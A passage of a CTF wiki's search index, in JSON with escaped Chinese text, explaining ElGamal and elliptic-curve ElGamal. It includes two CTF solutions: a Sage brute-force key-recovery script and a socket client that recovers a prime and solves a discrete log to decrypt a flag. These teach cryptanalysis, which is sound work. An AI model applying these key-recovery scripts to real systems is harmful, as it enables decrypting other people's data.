\n\n\n\u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\n\n\n\u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97\n\\oplus\n\\oplus\n \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe\np\\in E(Fq)\np\\in E(Fq)\n \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927\n\n\np \\oplus p \\oplus ... \\oplus p=O\np \\oplus p \\oplus ... \\oplus p=O\n\n\n\u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e\nQ\\in E(Fq)\nQ\\in E(Fq)\n \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49\nm=log_pq\nm=log_pq\n\n\nQ=m\\cdot p =p \\oplus p \\oplus ... \\oplus p\nQ=m\\cdot p =p \\oplus p \\oplus ... \\oplus p\n \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09\n\n\n\u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5\nE_q (a,b)\nE_q (a,b)\n \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3\nnG=O\nnG=O\n \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002\n\n\nECC\u4e2d\u7684ElGamal\n\n\n\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002\n\n\n\u5bc6\u94a5\u751f\u6210\n\n\n\u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf\nE_q (a,b)\nE_q (a,b)\n \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570\nn_a\nn_a\n\u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97\nP_a=n_aG\nP_a=n_aG\n\u3002\n\n\n\u5176\u4e2d\uff0c\nE_q(a,b), q,G\nE_q(a,b), q,G\n\u90fd\u4f1a\u88ab\u516c\u5f00\u3002\n\n\n\u516c\u94a5\u4e3a\nP_a\nP_a\n\uff0c\u79c1\u94a5\u4e3a$n_a $\u3002\n\n\n\u52a0\u5bc6\n\n\n\u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5\nE_q(a,b), q, P_a,G\nE_q(a,b), q, P_a,G\n \u3002\n\n\n\u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002\n\n\n\u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9\n(x_1,y_1)=kG\n(x_1,y_1)=kG\n \u3002\n\n\n\u8ba1\u7b97\u70b9\n(x_2,y_2)=kP_a\n(x_2,y_2)=kP_a\n \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002\n\n\n\u8ba1\u7b97\nC=m+(x_2,y_2)\nC=m+(x_2,y_2)\n\n\n\u5c06\n((x_1,y_1),C)\n((x_1,y_1),C)\n \u53d1\u9001\u7ed9A\u3002\n\n\n\n\n\u89e3\u5bc6\n\n\n\u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9\nn_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2)\nn_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2)\n\u3002\n\n\n\u8ba1\u7b97\u6d88\u606f\nm=C-(x_2,y_2)\nm=C-(x_2,y_2)\n \u3002\n\n\n\n\n\u5173\u952e\u70b9\n\n\n\u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86\n(x_1,y_1)\n(x_1,y_1)\n \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002\n\n\n\u4f8b\u5b50\n\n\n\u53c2\u8003\uff1a\nhttps://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis\n \u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis\u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b\n\n\n![](/crypto/asymmetric/discrete_log/example/2013 SECCON CTF quals Cryptanalysis/20140127213558.png)\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\n\n\n\u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002\n\n\n\u8fd9\u91cc\u76f4\u63a5\u53c2\u8003github\u4e0a\u7684sage\u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fasecret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002\n\n\na\n \n=\n \n1234577\n\n\nb\n \n=\n \n3213242\n\n\nn\n \n=\n \n7654319\n\n\n\nE\n \n=\n \nEllipticCurve\n(\nGF\n(\nn\n),\n \n[\n0\n,\n \n0\n,\n \n0\n,\n \na\n,\n \nb\n])\n\n\n\nbase\n \n=\n \nE\n([\n5234568\n,\n \n2287747\n])\n\n\npub\n \n=\n \nE\n([\n2366653\n,\n \n1424308\n])\n\n\n\nc1\n \n=\n \nE\n([\n5081741\n,\n \n6744615\n])\n\n\nc2\n \n=\n \nE\n([\n610619\n,\n \n6218\n])\n\n\n\nX\n \n=\n \nbase\n\n\n\nfor\n \ni\n \nin\n \nrange\n(\n1\n,\n \nn\n):\n\n    \nif\n \nX\n \n==\n \npub\n:\n\n        \nsecret\n \n=\n \ni\n\n        \nprint\n \n[+] secret:\n,\n \ni\n\n        \nbreak\n\n    \nelse\n:\n\n        \nX\n \n=\n \nX\n \n+\n \nbase\n\n        \nprint\n \ni\n\n\n\nm\n \n=\n \nc2\n \n-\n \n(\nc1\n \n*\n \nsecret\n)\n\n\n\nprint\n \n[+] x:\n,\n \nm\n[\n0\n]\n\n\nprint\n \n[+] y:\n,\n \nm\n[\n1\n]\n\n\nprint\n \n[+] x+y:\n,\n \nm\n[\n0\n]\n \n+\n \nm\n[\n1\n]\n\n\n\n\n\n\u66b4\u529b\u8dd1\u51fa\u7ed3\u679c\n\n\n[\n+\n]\n secret: \n1584718\n\n\n[\n+\n]\n x: \n2171002\n\n\n[\n+\n]\n y: \n3549912\n\n\n[\n+\n]\n x+y: \n5720914", 
            "title": "\u79bb\u6563\u5bf9\u6570\u76f8\u5173"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#elgamal", 
            "text": "", 
            "title": "ElGamal"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_1", 
            "text": "ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002  \u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c \u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50 \uff0c\u6b64\u5916g\u662f  Z_p^* Z_p^*   \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14  y \\in Z_p^* y \\in Z_p^*   \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) \uff0c\u6ee1\u8db3 g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p  \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a x=log_gy x=log_gy  \u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002", 
            "title": "\u57fa\u672c\u539f\u7406"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_3", 
            "text": "\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b   \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p  \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002  \u9009\u53d6 Z_p^* Z_p^*  \u7684\u751f\u6210\u5143g\u3002  \u968f\u673a\u9009\u53d6\u6574\u6570k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2  \uff0c\u5e76\u8ba1\u7b97 g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p  \u3002   \u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002", 
            "title": "\u5bc6\u94a5\u751f\u6210"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_4", 
            "text": "A\u9009\u53d6\u968f\u673a\u6570 r \\in Z_{p-1} r \\in Z_{p-1}  \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6 E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2)  \u3002\u5176\u4e2d y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p  \uff0c y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p  \u3002", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_5", 
            "text": "D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p  \u3002", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_6", 
            "text": "\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002", 
            "title": "\u96be\u70b9"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_7", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015\u4e2d\u7684Alicegame\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2am\uff0c\u7ed9\u4e00\u4e2ar\u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002  \u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86pk\u4e0esk       ( pk ,   sk )   =   genkey ( PBITS )   \u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b  def   genkey ( k ): \n     p   =   getPrime ( k ) \n     g   =   random . randrange ( 2 ,   p ) \n     x   =   random . randrange ( 1 ,   p - 1 ) \n     h   =   pow ( g ,   x ,   p ) \n     pk   =   ( p ,   g ,   h ) \n     sk   =   ( p ,   x ) \n     return   ( pk ,   sk )   p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86 h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p  \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002  \u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6  def   encrypt ( pk ,   m ,   r   =   None ): \n     ( p ,   g ,   h )   =   pk \n     if   r   is   None : \n         r   =   random . randrange ( 1 ,   p - 1 ) \n     c1   =   pow ( g ,   r ,   p ) \n     c2   =   ( m   *   pow ( h ,   r ,   p ))   %   p \n     return   ( c1 ,   c2 )   \u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002  \u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002  \u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14  c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p  c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p  \u5982\u679c\u6211\u4eec\u8bbe\u7f6e   r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g,c_2=h c_1=g,c_2=h  \u3002  r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g, c_2 = p-h c_1=g, c_2 = p-h  \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002   \u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002  \u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1 discrete_log  \u3002  \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c  import   socket  from   Crypto.Util.number   import   *  from   sage.all   import   *  def   get_maxfactor ( N ): \n     f   =   factor ( N ) \n     print   factor done \n     return   f [ - 1 ][ 0 ]  maxnumber   =   1     70  i   =   0  while   1 : \n     print   cycle:  , i \n     sock   =   socket . socket ( socket . AF_INET ,   socket . SOCK_STREAM ) \n     sock . connect (( localhost ,   9999 )) \n     sock . recv ( 17 ) \n     # get g,h \n     sock . recv ( 512 ) \n     sock . sendall ( 1 \\n ) \n     sock . recv ( 512 ) \n     sock . sendall ( 1 \\n ) \n     data   =   sock . recv ( 1024 ) \n     print   data \n     if   \\n   in   data : \n         data   = data [: data . index ( \\n )] \n     else : \n         # receive m= \n         sock . recv ( 1024 ) \n     ( g , h )   =   eval ( data ) \n\n     # get g,p \n     sock . sendall ( -1 \\n ) \n     sock . recv ( 512 ) \n     sock . sendall ( 1 \\n ) \n     data   =   sock . recv ( 1024 ) \n     print   data \n     if   \\n   in   data : \n         data   =   data [: data . index ( \\n )] \n     else : \n         # receive m= \n         sock . recv ( 512 ) \n     ( g , tmp )   =   eval ( data ) \n     p   =   tmp + h \n     tmp   =   get_maxfactor ( p - 1 ) \n     if   tmp maxnumber : \n         print   may be success \n         # skip the for cycle \n         sock . sendall ( quit \\n ); \n         data   =   sock . recv ( 1024 ) \n         print   receive data:  , data \n         data   =   data [ data . index ( : ) + 1 :] \n         ( c1 , c2 ) = eval ( data ) \n         # generate the group \n         g   =   Mod ( g ,   p ) \n         h   =   Mod ( h ,   p ) \n         c1   =   Mod ( c1 ,   p ) \n         c2   =   Mod ( c2 ,   p ) \n         x   =   discrete_log ( h ,   g ) \n         print   x =  ,   x \n         print   Flag:  ,   long_to_bytes ( long ( c2   /   (   c1   **   x ))) \n     sock . sendall ( quit \\n ) \n     sock . recv ( 1024 ) \n     sock . close () \n     i   +=   1   \u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#ecc", 
            "text": "", 
            "title": "ECC"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_8", 
            "text": "ECC\u5168\u79f0\u4e3a\u692d\u5706\u66f2\u7ebf\u52a0\u5bc6\uff0cEllipseCurve Cryptography\uff0c\u662f\u4e00\u79cd\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u6570\u5b66\u7684\u516c\u94a5\u5bc6\u7801\u3002\u4e0e\u4f20\u7edf\u7684\u57fa\u4e8e\u5927\u8d28\u6570\u56e0\u5b50\u5206\u89e3\u56f0\u96be\u6027\u7684\u52a0\u5bc6\u65b9\u6cd5\u4e0d\u540c\uff0cECC\u4f9d\u8d56\u4e8e\u89e3\u51b3\u692d\u5706\u66f2\u7ebf\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\u3002\u5b83\u7684\u4f18\u52bf\u4e3b\u8981\u5728\u4e8e\u76f8\u5bf9\u4e8e\u5176\u5b83\u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5728\u4f7f\u7528\u8f83\u77ed\u5bc6\u94a5\u957f\u5ea6\u7684\u540c\u65f6\u4fdd\u6301\u76f8\u540c\u7684\u5bc6\u7801\u5f3a\u5ea6\u3002\u76ee\u524d\u692d\u5706\u66f2\u7ebf\u4e3b\u8981\u91c7\u7528\u7684\u6709\u9650\u57df\u6709   \u4ee5\u7d20\u6570\u4e3a\u6a21\u7684\u6574\u6570\u57dfGF(p)\uff0c\u901a\u5e38\u5728\u901a\u7528\u5904\u7406\u5668\u4e0a\u66f4\u4e3a\u6709\u6548\u3002  \u7279\u5f81\u4e3a2\u7684\u4f3d\u7f57\u534e\u57dfGF\uff082^m\uff09\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u4e13\u95e8\u7684\u786c\u4ef6\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_9", 
            "text": "\u6211\u4eec\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\uff0c\u6709\u9650\u57df\u4e0a\u7684\u692d\u5706\u66f2\u7ebf\u662f\u6307\u5728\u692d\u5706\u66f2\u7ebf\u7684\u5b9a\u4e49\u5f0f  y^2+axy+by=x^3+cx^2+dx+e y^2+axy+by=x^3+cx^2+dx+e  \u4e2d\u6240\u6709\u7684\u7cfb\u6570\u90fd\u662f\u5728\u67d0\u4e2a\u6709\u9650\u57dfGF(p)\u4e2d\u7684\u5143\u7d20\uff0c\u5176\u4e2dp\u4e3a\u4e00\u4e2a\u5927\u7d20\u6570\u3002  \u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u692d\u5706\u66f2\u7ebf\u90fd\u9002\u5408\u4e8e\u52a0\u5bc6\uff0c\u6700\u4e3a\u5e38\u7528\u7684\u65b9\u7a0b\u5982\u4e0b  y^2=x^3+ax+b y^2=x^3+ax+b  \u5176\u4e2d 4a^3+27b^2 \\bmod p \\neq 0 4a^3+27b^2 \\bmod p \\neq 0  \u6211\u4eec\u79f0\u8be5\u65b9\u7a0b\u7684\u6240\u6709\u89e3(x,y)\uff0c( x\\in Fp , y \\in Fp x\\in Fp , y \\in Fp )\uff0c\u4ee5\u53ca\u4e00\u4e2a\u79f0\u4e3a\u201c\u65e0\u7a77\u8fdc\u70b9\u201d(O)\u7ec4\u6210\u7684\u96c6\u5408\u4e3a\u5b9a\u4e49\u5728Fp\u4e0a\u7684\u4e00\u4e2a\u692d\u5706\u66f2\u7ebf\uff0c\u8bb0\u4e3aE(Fp)\u3002   \u4e00\u822c\u5b9a\u4e49\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6  \u5047\u8bbeE(Fp)\u5bf9\u4e8e\u70b9\u7684\u8fd0\u7b97 \\oplus \\oplus  \u5f62\u6210\u4e00\u4e2aable\u7fa4\uff08\u4ea4\u6362\u7fa4\uff0c\u9006\u5143\u5b58\u5728\uff0c\u5c01\u95ed\u6027\u7b49\uff09\uff0c\u8bbe p\\in E(Fq) p\\in E(Fq)  \uff0c\u4e14\u6ee1\u8db3\u4e0b\u5217\u6761\u4ef6\u7684t\u5f88\u5927  p \\oplus p \\oplus ... \\oplus p=O p \\oplus p \\oplus ... \\oplus p=O  \u5176\u4e2d\u5171\u6709t\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\u3002\u8fd9\u91cc\u6211\u4eec\u79f0t\u4e3ap\u7684\u5468\u671f\u3002\u6b64\u5916\uff0c\u5bf9\u4e8e Q\\in E(Fq) Q\\in E(Fq)  \uff0c\u5b9a\u6709\u67d0\u4e2a\u6b63\u6574\u6570m\u4f7f\u5f97\u4e0b\u5217\u5f0f\u5b50\u6210\u7acb\uff0c\u5b9a\u4e49 m=log_pq m=log_pq  Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p Q=m\\cdot p =p \\oplus p \\oplus ... \\oplus p  \uff08m\u4e2ap\u53c2\u4e0e\u8fd0\u7b97\uff09  \u6b64\u5916\uff0c\u5047\u8bbeG\u662f\u8be5 E_q (a,b) E_q (a,b)  \u7684\u751f\u6210\u5143\uff0c\u5373\u53ef\u4ee5\u751f\u6210\u5176\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5176\u9636\u4e3a\u6ee1\u8db3 nG=O nG=O  \u7684\u6700\u5c0f\u6b63\u6574\u6570n\u3002", 
            "title": "\u57fa\u672c\u77e5\u8bc6"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#eccelgamal", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u7528\u6237B\u8981\u628a\u6d88\u606f\u52a0\u5bc6\u540e\u4f20\u7ed9\u7528\u6237A\u3002", 
            "title": "ECC\u4e2d\u7684ElGamal"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_10", 
            "text": "\u7528\u6237A\u5148\u9009\u62e9\u4e00\u6761\u692d\u5706\u66f2\u7ebf E_q (a,b) E_q (a,b)  \uff0c\u7136\u540e\u9009\u62e9\u5176\u4e0a\u7684\u4e00\u4e2a\u751f\u6210\u5143G\uff0c\u5047\u8bbe\u5176\u9636\u4e3an\uff0c\u4e4b\u540e\u518d\u9009\u62e9\u4e00\u4e2a\u6b63\u6574\u6570 n_a n_a \u4f5c\u4e3a\u5bc6\u94a5\uff0c\u8ba1\u7b97 P_a=n_aG P_a=n_aG \u3002  \u5176\u4e2d\uff0c E_q(a,b), q,G E_q(a,b), q,G \u90fd\u4f1a\u88ab\u516c\u5f00\u3002  \u516c\u94a5\u4e3a P_a P_a \uff0c\u79c1\u94a5\u4e3a$n_a $\u3002", 
            "title": "\u5bc6\u94a5\u751f\u6210"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_11", 
            "text": "\u7528\u6237B\u5728\u5411\u7528\u6237A\u53d1\u9001\u6d88\u606fm\uff0c\u8fd9\u91cc\u5047\u8bbe\u6d88\u606fm\u5df2\u7ecf\u88ab\u7f16\u7801\u4e3a\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5176\u52a0\u5bc6\u6b65\u9aa4\u5982\u4e0b   \u67e5\u8be2\u7528\u6237A\u7684\u516c\u94a5 E_q(a,b), q, P_a,G E_q(a,b), q, P_a,G  \u3002  \u5728(1,q-1) \u7684\u533a\u95f4\u5185\u9009\u62e9\u968f\u673a\u6570k \u3002  \u6839\u636eA\u7684\u516c\u94a5\u8ba1\u7b97\u70b9 (x_1,y_1)=kG (x_1,y_1)=kG  \u3002  \u8ba1\u7b97\u70b9 (x_2,y_2)=kP_a (x_2,y_2)=kP_a  \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002  \u8ba1\u7b97 C=m+(x_2,y_2) C=m+(x_2,y_2)  \u5c06 ((x_1,y_1),C) ((x_1,y_1),C)  \u53d1\u9001\u7ed9A\u3002", 
            "title": "\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_12", 
            "text": "\u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b   \u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9 n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) \u3002  \u8ba1\u7b97\u6d88\u606f m=C-(x_2,y_2) m=C-(x_2,y_2)  \u3002", 
            "title": "\u89e3\u5bc6"
        }, 
        {
            "location": "/crypto/asymmetric/discrete-log/discrete-log/#_13", 
